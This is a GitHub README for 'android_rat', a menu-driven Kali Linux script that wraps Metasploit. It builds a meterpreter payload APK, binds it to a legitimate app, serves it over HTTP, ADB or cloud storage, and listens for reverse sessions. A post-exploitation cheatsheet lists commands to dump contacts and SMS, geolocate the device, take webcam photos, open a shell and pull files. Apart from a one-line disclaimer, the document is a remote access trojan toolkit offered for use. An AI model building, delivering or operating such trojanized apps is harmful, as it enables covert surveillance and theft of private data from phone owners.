# android_rat

Android RAT toolkit for Kali Linux — build payload APK, start Metasploit listener, catch meterpreter sessions over LAN.

## Features

- Auto-detect LAN IP
- Build APK payload (msfvenom)
- Start Metasploit handler (msfconsole)
- Auto mode (LAN + payload + listener, one-key)
- Bind payload to legitimate APK
- Built-in HTTP delivery (`python3 -m http.server`)
- Post-exploitation cheatsheet

## Prerequisites

- Kali Linux (or Debian-based with Metasploit)
- Dependencies: `metasploit-framework`, `python3`, `curl`
- Android device on same network (WiFi / LAN)

## Install

```bash
git clone https://github.com/rizqihasanfadilla01-cmd/android_rat.git
cd android_rat
chmod +x android-rat.sh
./android-rat.sh
```

Dependencies will auto-install on first run.

## Usage

Menu-driven interface:

| Option | Description |
|--------|-------------|
| `[1]` | Detect LAN IP |
| `[2]` | Build payload APK |
| `[3]` | Auto mode (LAN + payload + listener) |
| `[4]` | Start listener (wait session) |
| `[5]` | Show active sessions |
| `[6]` | Stop all |
| `[7]` | Delivery methods |
| `[8]` | Bind to template APK |
| `[9]` | Post-exploitation cheatsheet |

### Quick Start

```bash
./android-rat.sh
# Select [3] Auto Mode
# Wait for payload to build
# Transfer APK to Android device
# When installed and opened, meterpreter session appears
```

### Build Payload Manually

```bash
./android-rat.sh
# Select [2] Build Payload
# Enter LHOST (your LAN IP, e.g. 192.168.1.10)
# Enter LPORT (default: 4444)
```

## Delivery Methods

1. **HTTP** — Built-in Python HTTP server on port 8080
2. **ADB** — `adb install payloads/<apk>`
3. **Cloud** — Upload to Google Drive / MediaFire

## Post-Exploitation

Once a session is established, use the Meterpreter console:

```
sysinfo          — Device info
dump_contacts    — Export contacts
dump_sms         — Export SMS
geolocate        — GPS coordinates
webcam_snap      — Take photo
shell            — Android shell
download FILE    — Pull file from device
upload FILE      — Push file to device
```

## Disclaimer

For authorized testing only on devices you own or have explicit permission to test. Unauthorized access is illegal.
